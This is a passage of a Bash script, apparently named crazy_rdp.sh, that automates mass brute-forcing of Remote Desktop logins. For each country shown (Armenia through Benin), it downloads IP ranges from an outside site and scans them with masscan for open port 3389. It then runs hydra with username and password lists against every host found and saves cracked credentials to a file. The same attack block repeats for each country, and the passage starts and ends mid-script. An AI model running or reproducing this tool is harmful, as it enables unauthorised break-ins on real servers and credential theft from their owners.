echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "10" ]; then
curl http://ipdiapazon.16mb.com/Armenia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "11" ]; then
curl http://ipdiapazon.16mb.com/Aruba.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "12" ]; then
curl http://ipdiapazon.16mb.com/Australia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "13" ]; then
curl http://ipdiapazon.16mb.com/Austria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "14" ]; then
curl http://ipdiapazon.16mb.com/Azerbaijan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "15" ]; then
curl http://ipdiapazon.16mb.com/Bahamas.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "16" ]; then
curl http://ipdiapazon.16mb.com/Bahrain.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "17" ]; then
curl http://ipdiapazon.16mb.com/Bangladesh.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "18" ]; then
curl http://ipdiapazon.16mb.com/Barbados.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "19" ]; then
curl http://ipdiapazon.16mb.com/Belarus.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "20" ]; then
curl http://ipdiapazon.16mb.com/Belgium.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "21" ]; then
curl http://ipdiapazon.16mb.com/Belize.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "22" ]; then
curl http://ipdiapazon.16mb.com/Benin.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
